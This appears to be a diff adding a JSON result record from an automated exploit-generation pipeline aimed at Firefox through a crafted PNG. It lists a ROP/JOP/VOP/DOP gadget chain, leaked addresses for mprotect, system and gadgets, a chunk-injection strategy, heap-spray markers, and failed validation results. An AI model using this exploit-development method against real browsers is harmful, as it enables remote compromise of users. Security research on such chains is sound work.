@@ -1,0 +1,71 @@
+{
+  "file": "sample_9.png.firefox.optimization_bypass.retry0.png",
+  "fuzz_type": "optimization_bypass",
+  "chain_type": "VOP",
+  "unique_id": "pwned_firefox_optimization_bypass_1783722684_0",
+  "attack_chain": [
+    "VOP_LDR_STR_Q0",
+    "VOP_FMOV_STR",
+    "DOP_VECTOR_COPY",
+    "ROP_OPTIMIZATION_BYPASS",
+    "JOP_OPTIMIZATION_BYPASS",
+    "VOP_OPTIMIZATION_BYPASS",
+    "DOP_OPTIMIZATION_BYPASS"
+  ],
+  "leaked_addresses": {
+    "mprotect": "0xf40dd22f7c00",
+    "system": "0xf40dd225cec4",
+    "payload": "0xb9a304410040",
+    "pop_x0_x1_x2_ret": "0xb9a3043f1798",
+    "ldp_x29_x30": "0xb9a3043f17ac",
+    "pop_x0_x1_x2_x30_br_x0": "0xb9a3043f17bc",
+    "jump_x0": "0xb9a3043f17d0",
+    "load_mprotect_x3": "0xb9a3043f1838",
+    "load_payload_x0": "0xb9a3043f1850",
+    "br_x3": "0xb9a3043f1868",
+    "ldr_x0_x1_br_x0": "0xb9a3043f1874",
+    "mov_x0_x1_br_x0": "0xb9a3043f1884",
+    "ldr_x1_x0_br_x1": "0xb9a3043f1894",
+    "mov_x1_x0_br_x1": "0xb9a3043f18a4",
+    "pop_x0_x1_ret": "0xb9a3043f18b4",
+    "pop_x0_ret": "0xb9a3043f18c4",
+    "pop_x1_ret": "0xb9a3043f18d4",
+    "ldr_x0_sp_br_x0": "0xb9a3043f18e4",
+    "ldr_x1_sp_br_x1": "0xb9a3043f18f4",
+    "gadget_vop_fmov": "0xb9a3043f1954",
+    "gadget_vop_ldr_str_q0": "0xb9a3043f1968",
+    "gadget_mov_x0_x1_br_x0": "0xb9a3043f1884",
+    "gadget_ldr_x0_x1_br_x0": "0xb9a3043f1874"
+  },
+  "chunk_injection_strategy": "animation_iend",
+  "instrumentation_validation": {
+    "valid": false,
+    "issues": [],
+    "warnings": [
+      "Multiple FITNESS_OK markers found (2), expected during heap spray - keeping last occurrence only"
+    ],
+    "embeddings": {
+      "ROP chain": 2956114,
+      "JOP chain": 2956179,
+      "VOP chain": 2955910,
+      "DOP chain": 2956020
+    },
+    "missing_triggers": [
+      "INJECTED_PAYLOAD marker missing"
+    ],
+    "payload_integrity": true,
+    "doubtful_fitness_markers": [
+      2956550
+    ]
+  },
+  "trigger_alignment": {
+    "aligned": false,
+    "trigger_offset": -1,
+    "payload_offset": -1,
+    "gap_bytes": -1,
+    "alignment_quality": "unknown",
+    "recommendations": [],
+    "trigger_type": "optimization_bypass",
+    "payload_slide": 0
+  }
+}
